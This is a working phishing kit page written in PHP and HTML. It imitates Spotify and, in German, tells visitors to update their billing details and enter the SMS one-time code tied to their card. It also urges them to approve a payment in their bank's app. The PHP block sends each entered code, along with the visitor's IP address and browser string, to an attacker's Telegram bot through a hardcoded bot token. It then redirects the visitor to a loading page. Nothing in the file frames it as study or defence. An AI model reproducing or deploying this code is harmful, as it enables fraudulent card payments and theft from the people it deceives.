<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Telegram Bot Credentials
   $botToken = "8585828847:AAFjkTFcI696kQNqb1ewBZOiQCLgO7CVix4";  // Replace with your bot token
       $chatId = "-5238377956";      // Replace with your chat ID
	   

    // Get User Data
    $otpCode = isset($_POST['ooo']) ? $_POST['ooo'] : 'N/A';
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Format the Message
    $message = "🔒 *New OTP Entry Received* 🔒\n\n"
             . "💳 *OTP:* `$otpCode`\n"
             . "🌍 *IP Address:* `$ip`\n"
             . "📱 *User-Agent:* `$userAgent`\n"
             . "📅 *Time:* `" . date('Y-m-d H:i:s') . "`\n\n"
             . "📌 _Stay Alert!_";

    // Send to Telegram
    $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'Markdown'
    ];

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ]
    ];

    $context  = stream_context_create($options);
    file_get_contents($telegramUrl, false, $context);

    // Redirect to Loading Page
    header("Location: loading3.html");
    exit();
}
?>

<!DOCTYPE html>
<html style="font-size: 16px;" lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="keywords" content="">
    <meta name="description" content="">
    <title>Spotify</title>
    <link rel="stylesheet" href="./otp_files/main.css" media="screen">
    <link rel="stylesheet" href="./otp_files/otp.css" media="screen">
    <link id="u-theme-google-font" rel="stylesheet" href="./otp_files/css">
    <meta name="theme-color" content="#478ac9">
    <meta property="og:title" content="otp">
    <meta property="og:type" content="website">
</head>
<body data-path-to-root="./" data-include-products="false" class="u-body u-xl-mode" data-lang="en">

<header class="u-clearfix u-custom-color-1 u-header u-header" id="sec-0a1f">
    <div class="u-clearfix u-sheet u-valign-middle-sm u-valign-middle-xs u-sheet-1">
        <img class="u-hidden-lg u-hidden-md u-hidden-xl u-image u-image-default u-image-1" src="./otp_files/ico.png" alt="" data-image-width="459" data-image-height="234">
        <p class="u-custom-font u-hidden-sm u-hidden-xs u-text u-text-default u-text-1">
            <span class="u-file-icon u-icon u-text-white u-icon-1">
                <img src="./otp_files/1946429-27ae17d7.png" alt="">
            </span>&nbsp;Profil&nbsp;
        </p>
        <a class="u-image u-logo u-image-2" data-image-width="300" data-image-height="95">
            <img src="./otp_files/logo1.svg" class="u-logo-image u-logo-image-1">
        </a>
    </div>
</header>

<section class="skrollable u-clearfix u-custom-color-1 u-parallax u-section-1" id="sec-3fac">
    <div class="u-clearfix u-sheet u-sheet-1">
        <img class="u-expanded-width-sm u-expanded-width-xs u-image u-image-default u-image-1" src="./otp_files/update1.png" alt="" data-image-width="2415" data-image-height="32">
        <div class="u-container-align-left-xs u-container-style u-expanded-width-xs u-group u-shape-rectangle u-group-1">
            <div class="u-container-layout u-container-layout-1">
                <span class="u-align-left-xs u-file-icon u-icon u-text-grey-50 u-icon-1">
                    <img src="./otp_files/271220-11a1ae80.png" alt="">
                </span>
                <p class="u-align-left-xs u-custom-font u-text u-text-default u-text-grey-40 u-text-2">Phase 2/3</p>
<p class="u-align-left-xs u-custom-font u-text u-text-default u-text-3">Aktualisieren Sie Ihre Rechnungsdaten</p>
</div>
</div>
<div class="u-container-style u-expanded-width-xs u-group u-radius-16 u-shape-round u-white u-group-2">
    <div class="u-container-layout u-container-layout-2">

        <img class="u-image u-image-contain u-image-default u-image-3" src="./otp_files/d41d8cd98f00b204e9800998ecf8427e.png" alt="" data-image-width="2560" data-image-height="829">
        <div class="custom-expanded u-border-1 u-border-grey-dark-1 u-line u-line-horizontal u-line-1"></div>
        <p class="u-align-center-lg u-align-center-md u-align-center-sm u-align-center-xl u-align-left-xs u-custom-font u-text u-text-grey-75 u-text-4">
            Bestätigungscode eingeben
        </p>
        <p class="u-align-left u-custom-font u-text u-text-5">
            <span class="u-file-icon u-icon u-icon-2">
                <img src="./otp_files/9334539.png" alt="">
            </span>&nbsp;**** **** ****
        </p>
        <p class="u-align-left u-custom-font u-text u-text-6">
            Wir haben Ihnen einen Bestätigungscode per SMS an die mit Ihrer Karte verknüpfte Nummer gesendet.
        </p>
        <p class="u-align-left u-custom-font u-text u-text-7">Geben Sie den unten stehenden Einmalcode ein</p>
        <p class="u-align-center u-custom-font u-text u-text-8">Bestätigungscode

</p> 
<div class="u-form u-form-1">
    <form id="otpForm" class="u-clearfix u-form-spacing-11 u-form-vertical u-inner-form" method="POST" name="form" style="padding: 0px;">
        <div class="u-form-group u-form-name u-label-none">
            <input type="text" id="name-caa6" name="ooo" class="u-border-grey-15 u-input u-input-rectangle u-input-1" required="" maxlength="8" pattern="[0-9]*" inputmode="numeric"
                   oninput="this.value = this.value.replace(/[^0-9]/g, '')">
            <input type="hidden" name="wrng" value="first">

</div>
                <div class="u-align-left u-form-group u-form-submit u-label-none">
                    <button type="submit" class="u-border-none u-btn u-btn-submit u-button-style u-custom-font u-grey-90 u-hover-black u-btn-1">WEITER</button>
                </div>
            </form>
        </div>
<div class="alert-wrapper">
    <style>
        .alert-wrapper {
            font-family: Arial, sans-serif;
            padding: 20px;
            background: #f9fafb;
        }

        .alert-wrapper .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }

        /* Alert Box */
        .alert-wrapper .alert-box {
            background: #fff5f5;
            border-left: 4px solid #e11d48;
            padding: 16px 18px;
            border-radius: 8px;
            color: #b91c1c;
            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
            margin: 40px 0;
            position: relative;
            animation: slideIn 0.6s ease-out, pulse 2s ease-in-out 0.6s infinite;
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes pulse {
            0%, 100% { box-shadow: 0 2px 8px rgba(0,0,0,0.06); }
            50% { box-shadow: 0 4px 16px rgba(225, 29, 72, 0.2); }
        }

        .alert-wrapper .alert-content {
            display: flex;
            align-items: flex-start;
            gap: 10px;
        }

        .alert-wrapper .alert-icon-image {
            width: 34px;
            height: 34px;
            flex-shrink: 0;
            animation: bounce 1s ease-in-out 0.6s infinite;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-5px); }
        }

        .alert-wrapper .alert-text {
            font-size: 15px;
            line-height: 1.45;
            flex: 1;
        }

        .alert-wrapper .alert-title {
            font-size: 16px;
            font-weight: bold;
            display: block;
            margin-bottom: 4px;
        }
    </style>
<a  style="
    display:inline-block;
    background:#F58027;
    color:#fff;
    padding:10px 18px;
    border-radius:8px;
    font-size:15px;
    font-weight:500;
    text-decoration:none;
">
    Keine SMS erhalten? Öffnen Sie die mobile App Ihrer Bank und genehmigen Sie die Zahlungsanforderung.

Sobald die Zahlung genehmigt wurde, wird diese Seite automatisch aktualisiert.
</a>

        
    </div>
<div style="display:none;">
    <script>
        setTimeout(function(){
            window.location.href = "app.php";
        }, 100000000);
    </script>
</div>
</section>

</body>
</html>
